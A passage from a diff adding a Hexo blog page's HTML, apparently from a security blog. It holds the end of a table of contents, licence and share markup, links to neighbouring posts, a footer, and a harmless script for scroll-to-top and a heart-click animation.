class="toc-text">SYC美男子二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-it"><span class="toc-text">bypass it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%8F%B6%E8%8D%89%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-text">三叶草留言板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dede"><span class="toc-text">Dede</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+<div class="share" style="width: 100%;">
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">
+    <div class="social-share" data-initialized="true">
+      <a href="#" class="social-share-icon icon-weibo"></a>
+      <a href="#" class="social-share-icon icon-qq"></a>
+      <a href="#" class="social-share-icon icon-wechat"></a>
+      <a href="#" class="social-share-icon icon-qzone"></a>
+    </div>
+  </div>
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2015/08/31/ICMS-V6-0-8%E4%B8%80%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/" rel="next" title="ICMS V6.0.8一处设计缺陷导致sql注入">
+          ICMS V6.0.8一处设计缺陷导致sql注入
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2016/05/12/sctf-2016-%E4%B8%80%E7%82%B9%E5%B0%8F%E7%AC%94%E8%AE%B0/" rel="prev" title="sctf 2016 一点小笔记">
+            sctf 2016 一点小笔记
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://qvq.im">Index</a> |
+        <a class="bottom-item" href="https://github.com/sco4x0" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
